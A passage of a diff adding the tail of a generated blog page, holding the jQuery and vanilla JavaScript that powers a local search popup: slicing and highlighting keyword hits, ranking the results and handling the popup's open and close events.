+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
